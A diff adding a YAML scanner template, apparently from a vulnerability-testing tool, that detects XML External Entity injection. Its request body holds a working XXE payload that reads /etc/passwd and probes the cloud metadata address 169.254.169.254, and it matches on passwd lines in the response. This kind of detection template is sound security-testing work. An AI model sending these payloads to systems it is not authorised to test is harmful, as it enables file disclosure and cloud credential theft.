@@ -1,0 +1,33 @@
+metadata:
+  id: "xxe"
+  name: "XML External Entity Injection"
+  description: "Detects XXE by injecting external entity definitions"
+  severity: "critical"
+  tags: ["xxe", "xml", "injection", "entity"]
+
+engine: "http"
+method: "POST"
+path: "/"
+headers:
+  Content-Type: "application/xml"
+
+body: |
+  <?xml version="1.0"?>
+  <!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///FUZZ">
+  ]>
+  <root>&xxe;</root>
+
+payloads:
+  - name: "file-read"
+    value: "/etc/passwd"
+  - name: "internal-srv"
+    value: "http://169.254.169.254/latest/meta-data/"
+
+matchers:
+  - type: "keyword"
+    patterns:
+      - "root:x:0:0"
+      - "daemon:x:1:1"
+    location: "body"
+    condition: "or"
